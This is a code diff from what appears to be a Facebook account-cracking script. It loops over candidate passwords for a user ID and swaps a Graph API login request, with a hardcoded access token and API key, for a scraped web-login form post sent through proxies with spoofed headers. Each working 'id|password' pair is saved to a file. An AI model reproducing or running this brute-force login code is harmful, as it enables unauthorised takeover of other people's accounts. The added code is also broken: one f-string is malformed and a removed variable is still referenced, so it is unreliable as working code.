@@ -996,52 +996,11 @@ def gxds_files(uid, pxss):
     session = requests.Session()
     try:
         for ps in pxss:
-            data = {
-                "adid": str(uuid.uuid4()),
-                "format": "json",
-                "device_id": str(uuid.uuid4()),
-                "cpl": "true",
-                "family_device_id": str(uuid.uuid4()),
-                "credentials_type": "device_based_login_password",
-                "error_detail_type": "button_with_disabled",
-                "source": "device_based_login",
-                "email": uid,
-                "password": ps,
-                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
-                "generate_session_cookies": "1",
-                "meta_inf_fbmeta": "",
-                "advertiser_id": str(uuid.uuid4()),
-                "currently_logged_in_userid": "0",
-                "locale": "en_GB",
-                "client_country_code": "GB",
-                "method": "auth.login",
-                "fb_api_req_friendly_name": "authenticate",
-                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-                "api_key": "882a8490361da98702bf97a021ddc14d",
-            }
-            headers = {
-                "User-Agent": random.choice(gxdsUArndm),
-                "Content-Type": "application/x-www-form-urlencoded",
-                "Host": "graph.facebook.com",
-                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
-                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
-                "X-FB-Connection-Type": "MOBILE.LTE",
-                "X-Tigon-Is-Retry": "False",
-                "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
-                "x-fb-device-group": "5120",
-                "X-FB-Friendly-Name": "ViewerReactionsMutation",
-                "X-FB-Request-Analytics-Tags": "graphservice",
-                "X-FB-HTTP-Engine": "Liger",
-                "X-FB-Client-IP": "True",
-                "X-FB-Server-Cluster": "True",
-                "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
-            }
-            q = session.post(
-                "https://b-graph.facebook.com/auth/login",
-                data=data,
-                headers=headers,
-                allow_redirects=False,
-            ).json()
+            gxdsfbs = session.get(f'{url').text
+            info={"lsd":re.search('name="lsd" value="(.*?)"', str(gxdsfbs)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(gxdsfbs)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(gxdsfbs)).group(1),"li":re.search('name="li" value="(.*?)"', str(gxdsfbs)).group(1),"try_number":"0","unrecognized_tries":"0","email":uid,"pass":ps,"login":"Log In"}
+            update= {"authority": f'{fb}.facebook.com',"method": 'POST',"scheme": 'https',"accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',"accept-encoding": 'gzip, deflate, br',"accept-language": 'en-US,en;q=1',"cache-control": 'no-cache, no-store, must-revalidate',"referer": f'https://{fb}.facebook.com/',"sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',"sec-ch-ua-mobile": '?0',"sec-ch-ua-platform": "Windows","sec-fetch-dest": 'document',"sec-fetch-mode": 'navigate',"sec-fetch-site": 'same-origin',"sec-fetch-user": '?1',"pragma": 'no-cache',"priority": 'u=1',"cross-origin-resource-policy": 'cross-origin',"upgrade-insecure-requests": '1',"user-agent": uuu,}
+            session.post(url=f"https://{fb}.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",data=info,headers=update,proxies=prox).text
+            eehhcc=session.cookies.get_dict().keys()
             if "session_key" in q:
                 print(f"\r\r{lgr}  [GXDS-OK] {uid}|{ps}")
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
